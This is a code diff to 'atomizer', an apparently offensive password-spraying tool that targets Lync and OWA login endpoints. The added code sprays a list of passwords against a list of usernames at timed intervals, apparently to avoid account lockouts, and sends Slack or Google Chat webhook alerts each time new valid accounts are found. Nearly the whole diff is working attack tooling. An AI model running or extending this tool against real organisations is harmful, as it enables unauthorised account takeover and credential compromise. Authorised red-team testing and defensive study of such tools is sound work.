@@ -3,6 +3,7 @@
 """
 Usage:
     atomizer (lync|owa) <target> <password> <userfile> [--threads THREADS] [--debug]
+    atomizer (lync|owa) <target> <passwordfile> <userfile> --interval <TIME> [--gchat <URL>] [--slack <URL>][--threads THREADS] [--debug]
     atomizer (lync|owa) <target> --csvfile CSVFILE [--user-row-name NAME] [--pass-row-name NAME] [--threads THREADS] [--debug]
     atomizer (lync|owa) <target> --user-as-pass USERFILE [--threads THREADS] [--debug]
     atomizer (lync|owa) <target> --recon [--debug]
@@ -10,17 +11,21 @@ Usage:
     atomizer -v | --version
 
 Arguments:
-    target     target domain or url
-    password   password to spray
-    userfile   file containing usernames (one per line)
+    target         target domain or url
+    password       password to spray
+    userfile       file containing usernames (one per line)
+    passwordfile   file containing passwords (one per line)
 
 Options:
     -h, --help               show this screen
     -v, --version            show version
     -c, --csvfile CSVFILE    csv file containing usernames and passwords
+    -i, --interval TIME      spray at the specified interval [format: "H:M:S"]
     -t, --threads THREADS    number of concurrent threads to use [default: 3]
     -d, --debug              enable debug output
     --recon                  only collect info, don't password spray
+    --gchat URL              gchat webhook url for notification
+    --slack URL              slack webhook url for notification
     --user-row-name NAME     username row title in CSV file [default: Email Address]
     --pass-row-name NAME     password row title in CSV file [default: Password]
     --user-as-pass USERFILE  use the usernames in the specified file as the password (one per line)
@@ -37,6 +42,8 @@ from pathlib import Path
 from docopt import docopt
 from core.utils.messages import *
 from core.sprayers import Lync, OWA
+from core.utils.time import countdown_timer
+from core.webhooks import gchat, slack
 
 
 class Atomizer:
@@ -150,7 +157,32 @@ if __name__ == "__main__":
         for sig in (signal.SIGINT, signal.SIGTERM):
             loop.add_signal_handler(sig, atomizer.shutdown)
 
-        if args['<userfile>']:
+        if args['--interval']:
+            popped_accts = 0
+            with open(args['<passwordfile>']) as passwordfile:
+                password = passwordfile.readline()
+                while password != "":
+                    with open(args['<userfile>']) as userfile:
+                            loop.run_until_complete(
+                                atomizer.atomize(
+                                    userfile=userfile,
+                                    password=password.strip()
+                                )
+                            )
+
+                            if popped_accts != len(atomizer.sprayer.valid_accounts):
+                                popped_accts = len(atomizer.sprayer.valid_accounts)
+
+                                if args['--gchat']:
+                                    gchat(args['--gchat'], args['<target>'], atomizer.sprayer)
+                                if args['--slack']:
+                                    slack(args['--slack'], args['<target>'], atomizer.sprayer)
+
+                            password = passwordfile.readline()
+                            if password:
+                                countdown_timer(*args['--interval'].split(':'))
+
+        elif args['<userfile>']:
             with open(args['<userfile>']) as userfile:
                     loop.run_until_complete(
                         atomizer.atomize(
